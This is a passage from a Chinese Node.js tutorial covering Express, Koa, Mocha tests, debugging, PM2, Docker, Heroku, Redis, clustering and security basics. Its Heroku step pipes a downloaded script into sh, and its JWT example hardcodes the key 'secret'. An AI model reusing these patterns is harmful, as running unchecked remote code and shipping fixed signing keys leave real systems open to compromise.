class="hljs-subst">$&#123;req.params.id&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>使用中间件：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Request URL: <span class="hljs-subst">$&#123;req.url&#125;</span>`</span>);<br>  <span class="hljs-title function_">next</span>();<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="6-1-3-处理表单和-JSON-数据"><a href="#6-1-3-处理表单和-JSON-数据" class="headerlink" title="6.1.3 处理表单和 JSON 数据"></a>6.1.3 处理表单和 JSON 数据</h4><p><code>Express</code> 可以使用 <code>express.urlencoded()</code> 和 <code>express.json()</code> 中间件来处理表单数据和 JSON 数据。</p><p><strong>处理 JSON 数据：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/submit&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(req.<span class="hljs-property">body</span>);<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Data received.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="6-1-4-错误处理"><a href="#6-1-4-错误处理" class="headerlink" title="6.1.4 错误处理"></a>6.1.4 错误处理</h4><p>定义错误处理中间件，捕获路由和中间件中的错误。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">err, req, res, next</span>) =&gt;</span> &#123;<br><br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">stack</span>);<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Something broke!&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="6-2-使用-Koa-框架"><a href="#6-2-使用-Koa-框架" class="headerlink" title="6.2 使用 Koa 框架"></a>6.2 使用 Koa 框架</h3><p><code>Koa</code> 是由 Express 的原始团队设计的新一代 Web 框架，基于中间件的功能更强大、更灵活。</p><h4 id="6-2-1-Koa-的特点与-Express-对比"><a href="#6-2-1-Koa-的特点与-Express-对比" class="headerlink" title="6.2.1 Koa 的特点与 Express 对比"></a>6.2.1 Koa 的特点与 Express 对比</h4><ul><li><strong>更现代化</strong>：Koa 使用 ES6 <code>async/await</code> 处理异步操作，简化了代码逻辑。</li><li><strong>中间件设计</strong>：Koa 的中间件更加灵活，开发者可以完全控制响应流程。</li></ul><h4 id="6-2-2-创建-Koa-应用"><a href="#6-2-2-创建-Koa-应用" class="headerlink" title="6.2.2 创建 Koa 应用"></a>6.2.2 创建 Koa 应用</h4><p>安装 <code>Koa</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install koa<br></code></pre></td></tr></table></figure><p><strong>创建基本 Koa 应用：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Koa</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Koa</span>();<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">async</span> (ctx) =&gt; &#123;<br>  ctx.<span class="hljs-property">body</span> = <span class="hljs-string">&#x27;Hello, Koa!&#x27;</span>;<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server running on http://localhost:3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="6-2-3-中间件与路由处理"><a href="#6-2-3-中间件与路由处理" class="headerlink" title="6.2.3 中间件与路由处理"></a>6.2.3 中间件与路由处理</h4><p><strong>定义中间件：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">async</span> (ctx, next) =&gt; &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Request URL: <span class="hljs-subst">$&#123;ctx.url&#125;</span>`</span>);<br>  <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>处理路由：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Router</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa-router&#x27;</span>);<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>();<br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/user/:id&#x27;</span>, <span class="hljs-title function_">async</span> (ctx) =&gt; &#123;<br>  ctx.<span class="hljs-property">body</span> = <span class="hljs-string">`User ID: <span class="hljs-subst">$&#123;ctx.params.id&#125;</span>`</span>;<br>&#125;);<br><br>app.<span class="hljs-title function_">use</span>(router.<span class="hljs-title function_">routes</span>());<br></code></pre></td></tr></table></figure><hr><h2 id="7-测试与调试-1"><a href="#7-测试与调试-1" class="headerlink" title="7. 测试与调试"></a>7. 测试与调试</h2><p>Node.js 提供了多种测试与调试工具，帮助开发者确保代码的正确性和性能。</p><h3 id="7-1-单元测试与集成测试"><a href="#7-1-单元测试与集成测试" class="headerlink" title="7.1 单元测试与集成测试"></a>7.1 单元测试与集成测试</h3><p>单元测试是确保各个模块功能正常的基本方式。<code>Mocha</code> 是 Node.js 中常用的测试框架，配合 <code>Chai</code> 进行断言。</p><h4 id="7-1-1-使用-Mocha-进行单元测试"><a href="#7-1-1-使用-Mocha-进行单元测试" class="headerlink" title="7.1.1 使用 Mocha 进行单元测试"></a>7.1.1 使用 Mocha 进行单元测试</h4><p>安装 <code>Mocha</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install --save-dev mocha<br></code></pre></td></tr></table></figure><p><strong>编写简单测试：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> assert = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;assert&#x27;</span>);<br><br><span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;Math Test&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;should return the sum of two numbers&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    assert.<span class="hljs-title function_">strictEqual</span>(<span class="hljs-number">1</span> + <span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>运行测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npx mocha<br></code></pre></td></tr></table></figure><h4 id="7-1-2-使用-Chai-进行断言"><a href="#7-1-2-使用-Chai-进行断言" class="headerlink" title="7.1.2 使用 Chai 进行断言"></a>7.1.2 使用 Chai 进行断言</h4><p>安装 <code>Chai</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install chai --save-dev<br></code></pre></td></tr></table></figure><p><strong>使用 <code>Chai</code> 进行更丰富的断言：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> chai = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;chai&#x27;</span>);<br><span class="hljs-keyword">const</span> expect = chai.<span class="hljs-property">expect</span>;<br><br><span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;Math Test&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;should return the sum of two numbers&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">expect</span>(<span class="hljs-number">1</span> + <span class="hljs-number">1</span>).<span class="hljs-property">to</span>.<span class="hljs-title function_">equal</span>(<span class="hljs-number">2</span>);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="7-1-3-测试异步代码"><a href="#7-1-3-测试异步代码" class="headerlink" title="7.1.3 测试异步代码"></a>7.1.3 测试异步代码</h4><p>Mocha 支持测试异步代码，使用 <code>done</code> 回调或者 <code>async/await</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;Async Test&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;should test async code&#x27;</span>, <span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-number">42</span>), <span class="hljs-number">100</span>));<br>    <span class="hljs-title function_">expect</span>(result).<span class="hljs-property">to</span>.<span class="hljs-title function_">equal</span>(<span class="hljs-number">42</span>);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="7-2-调试-Node-js-应用"><a href="#7-2-调试-Node-js-应用" class="headerlink" title="7.2 调试 Node.js 应用"></a>7.2 调试 Node.js 应用</h3><h4 id="7-2-1-使用-console-log-调试"><a href="#7-2-1-使用-console-log-调试" class="headerlink" title="7.2.1 使用 console.log 调试"></a>7.2.1 使用 <code>console.log</code> 调试</h4><p>最简单的调试方式是通过 <code>console.log()</code> 输出变量值和函数的执行情况。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Debugging: &#x27;</span>, someVariable);<br></code></pre></td></tr></table></figure><h4 id="7-2-2-使用-Node-js-内置调试器"><a href="#7-2-2-使用-Node-js-内置调试器" class="headerlink" title="7.2.2 使用 Node.js 内置调试器"></a>7.2.2 使用 <code>Node.js</code> 内置调试器</h4><p>Node.js 自带了调试器，允许开发者设置断点并逐步调试代码。</p><p><strong>启动调试模式：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">node inspect app.js<br></code></pre></td></tr></table></figure><h4 id="7-2-3-使用-VS-Code-调试-Node-js-应用"><a href="#7-2-3-使用-VS-Code-调试-Node-js-应用" class="headerlink" title="7.2.3 使用 VS Code 调试 Node.js 应用"></a>7.2.3 使用 <code>VS Code</code> 调试 Node.js 应用</h4><p><code>Visual Studio Code</code> 提供了强大的调试工具，允许直接在编辑器中设置断点并运行调试。</p><p><strong>配置 <code>launch.json</code>：</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.2.0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;node&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;request&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;launch&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Launch Program&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;program&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/app.js&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><hr><h2 id="8-部署与性能优化-1"><a href="#8-部署与性能优化-1" class="headerlink" title="8. 部署与性能优化"></a>8. 部署与性能优化</h2><p>Node.js 应用可以通过多种方式进行部署，如使用 <strong>PM2</strong>、<strong>Docker</strong> 或在 <strong>云平台</strong> 上进行托管。</p><h3 id="8-1-部署-Node-js-应用"><a href="#8-1-部署-Node-js-应用" class="headerlink" title="8.1 部署 Node.js 应用"></a>8.1 部署 Node.js 应用</h3><h4 id="8-1-1-使用-PM2-进行进程管理"><a href="#8-1-1-使用-PM2-进行进程管理" class="headerlink" title="8.1.1 使用 PM2 进行进程管理"></a>8.1.1 使用 <code>PM2</code> 进行进程管理</h4><p><code>PM2</code> 是一个强大的 Node.js 进程管理工具，支持自动重启、日志管理等功能。</p><p>安装 <code>PM2</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install pm2 -g<br></code></pre></td></tr></table></figure><p><strong>启动应用：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pm2 start app.js<br></code></pre></td></tr></table></figure><p><strong>查看应用状态：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pm2 status<br></code></pre></td></tr></table></figure><h4 id="8-1-2-Docker-部署-Node-js-应用"><a href="#8-1-2-Docker-部署-Node-js-应用" class="headerlink" title="8.1.2 Docker 部署 Node.js 应用"></a>8.1.2 Docker 部署 Node.js 应用</h4><p><strong>创建 <code>Dockerfile</code>：</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Dockerfile"><span class="hljs-keyword">FROM</span> node:<span class="hljs-number">14</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /app</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> . .</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> npm install</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;node&quot;</span>, <span class="hljs-string">&quot;app.js&quot;</span>]</span><br></code></pre></td></tr></table></figure><p><strong>构建 Docker 镜像并运行：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build -t myapp .<br>docker run -p 3000:3000 myapp<br></code></pre></td></tr></table></figure><h4 id="8-1-3-在云平台上部署-Node-js"><a href="#8-1-3-在云平台上部署-Node-js" class="headerlink" title="8.1.3 在云平台上部署 Node.js"></a>8.1.3 在云平台上部署 Node.js</h4><p>Node.js 可以轻松部署到各种云平台，如 AWS、Heroku、Google Cloud 等。</p><p><strong>Heroku 部署步骤：</strong></p><ol><li><p>安装 Heroku CLI：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://cli-assets.heroku.com/install.sh | sh<br></code></pre></td></tr></table></figure></li><li><p>登录 Heroku：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">heroku login<br></code></pre></td></tr></table></figure></li><li><p>部署应用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">heroku create<br>git push heroku master<br></code></pre></td></tr></table></figure></li></ol><h3 id="8-2-性能优化与缓存"><a href="#8-2-性能优化与缓存" class="headerlink" title="8.2 性能优化与缓存"></a>8.2 性能优化与缓存</h3><h4 id="8-2-1-使用-Redis-缓存"><a href="#8-2-1-使用-Redis-缓存" class="headerlink" title="8.2.1 使用 Redis 缓存"></a>8.2.1 使用 Redis 缓存</h4><p>Redis 是一种内存数据结构存储，常用于缓存数据以减少数据库压力。</p><p>安装 Redis 客户端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install redis<br></code></pre></td></tr></table></figure><p><strong>连接 Redis 并设置缓存：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> redis = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;redis&#x27;</span>);<br><span class="hljs-keyword">const</span> client = redis.<span class="hljs-title function_">createClient</span>();<br><br>client.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, redis.<span class="hljs-property">print</span>);<br>client.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, reply</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(reply);  <span class="hljs-comment">// 输出: value</span><br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="8-2-2-内存优化与垃圾回收"><a href="#8-2-2-内存优化与垃圾回收" class="headerlink" title="8.2.2 内存优化与垃圾回收"></a>8.2.2 内存优化与垃圾回收</h4><p>Node.js 是基于 V8 引擎的，V8 自带了垃圾回收机制，但在大数据处理时需要注意内存管理。</p><p><strong>检测内存使用情况：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(process.<span class="hljs-title function_">memoryUsage</span>());<br></code></pre></td></tr></table></figure><h4 id="8-2-3-使用集群模式提高性能"><a href="#8-2-3-使用集群模式提高性能" class="headerlink" title="8.2.3 使用集群模式提高性能"></a>8.2.3 使用集群模式提高性能</h4><p>Node.js 单线程模型可以通过 <strong>Cluster 模式</strong> 利用多核 CPU 提高性能。</p><p><strong>使用 <code>cluster</code> 模块创建多进程：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> cluster = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cluster&#x27;</span>);<br><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;os&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (cluster.<span class="hljs-property">isMaster</span>) &#123;<br>  <span class="hljs-keyword">const</span> numCPUs = os.<span class="hljs-title function_">cpus</span>().<span class="hljs-property">length</span>;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Master process running, spawning <span class="hljs-subst">$&#123;numCPUs&#125;</span> workers...`</span>);<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; numCPUs; i++) &#123;<br>    cluster.<span class="hljs-title function_">fork</span>();<br>  &#125;<br>  <br>  cluster.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">worker, code, signal</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Worker <span class="hljs-subst">$&#123;worker.process.pid&#125;</span> died.`</span>);<br>  &#125;);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>);<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;Hello from worker\n&#x27;</span>);<br>  &#125;).<span class="hljs-title function_">listen</span>(<span class="hljs-number">8000</span>);<br>  <br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Worker <span class="hljs-subst">$&#123;process.pid&#125;</span> started`</span>);<br>&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="9-安全性-1"><a href="#9-安全性-1" class="headerlink" title="9. 安全性"></a>9. 安全性</h2><p>Node.js 的安全性在 Web 应用中至关重要，常见的威胁包括 <strong>注入攻击</strong>、<strong>跨站脚本攻击 (XSS)</strong> 和 <strong>CSRF</strong>。</p><h3 id="9-1-安全性最佳实践"><a href="#9-1-安全性最佳实践" class="headerlink" title="9.1 安全性最佳实践"></a>9.1 安全性最佳实践</h3><h4 id="9-1-1-防止注入攻击"><a href="#9-1-1-防止注入攻击" class="headerlink" title="9.1.1 防止注入攻击"></a>9.1.1 防止注入攻击</h4><p>避免直接拼接用户输入的数据，使用参数化查询防止 SQL 注入。</p><p><strong>使用参数化查询：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">connection.<span class="hljs-title function_">query</span>(<span class="hljs-string">&#x27;SELECT * FROM users WHERE id = ?&#x27;</span>, [userId], <span class="hljs-function">(<span class="hljs-params">err, results</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(results);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="9-1-2-防止跨站脚本攻击-XSS"><a href="#9-1-2-防止跨站脚本攻击-XSS" class="headerlink" title="9.1.2 防止跨站脚本攻击 (XSS)"></a>9.1.2 防止跨站脚本攻击 (XSS)</h4><p>使用输入校验、输出编码和安全库（如 <code>helmet.js</code>）防止 XSS 攻击。</p><p><strong>输出编码：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> sanitizedData = <span class="hljs-title function_">escapeHtml</span>(userInput);<br></code></pre></td></tr></table></figure><h4 id="9-1-3-使用-helmet-js-保护应用"><a href="#9-1-3-使用-helmet-js-保护应用" class="headerlink" title="9.1.3 使用 helmet.js 保护应用"></a>9.1.3 使用 <code>helmet.js</code> 保护应用</h4><p><code>helmet.js</code> 是用于保护 Express 应用的安全库。</p><p>安装 <code>helmet</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install helmet<br></code></pre></td></tr></table></figure><p><strong>在 Express 中使用：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> helmet = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;helmet&#x27;</span>);<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">helmet</span>());<br></code></pre></td></tr></table></figure><h3 id="9-2-身份验证与授权"><a href="#9-2-身份验证与授权" class="headerlink" title="9.2 身份验证与授权"></a>9.2 身份验证与授权</h3><h4 id="9-2-1-使用-JWT-进行身份验证"><a href="#9-2-1-使用-JWT-进行身份验证" class="headerlink" title="9.2.1 使用 JWT 进行身份验证"></a>9.2.1 使用 JWT 进行身份验证</h4><p>JWT (JSON Web Token) 是一种轻量级的身份验证机制，通常用于</p><p> API 身份认证。</p><p>安装 <code>jsonwebtoken</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install jsonwebtoken<br></code></pre></td></tr></table></figure><p><strong>生成 JWT：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">const</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">userId</span>: <span class="hljs-number">123</span> &#125;, <span class="hljs-string">&#x27;secret&#x27;</span>, &#123; <span class="hljs-attr">expiresIn</span>: <span class="hljs-string">&#x27;1h&#x27;</span> &#125;);<br></code></pre></td></tr></table></figure><h4 id="9-2-2-OAuth-与第三方登录集成"><a href="#9-2-2-OAuth-与第三方登录集成" class="headerlink" title="9.2.2 OAuth 与第三方登录集成"></a>9.2.2 OAuth 与第三方登录集成</h4><p>OAuth 是一种授权协议，常用于集成第三方登录（如 Google、Facebook）。</p><p>使用 <code>passport.js</code> 库实现 OAuth 登录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install passport passport-google-oauth<br></code></pre></td></tr></table></figure><hr><h2 id="10-实战项目-1"><a href="#10-实战项目-1" class="headerlink" title="10. 实战项目"></a>10. 实战项目</h2><h3 id="10-1-构建-RESTful-API"><a href="#10-1-构建-RESTful-API" class="headerlink" title="10.1 构建 RESTful API"></a>10.1 构建 RESTful API</h3><p>构建 RESTful API 是 Node.js 的常见应用场景之一。以下是使用 <code>Express</code> 框架构建 RESTful API 的基础示例。</p><h4 id="10-1-1-RESTful-API-基础"><a href="#10-1-1-RESTful-API-基础" class="headerlink" title="10.1.1 RESTful API 基础"></a>10.1.1 RESTful API 基础</h4><p><strong>定义基本路由：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title 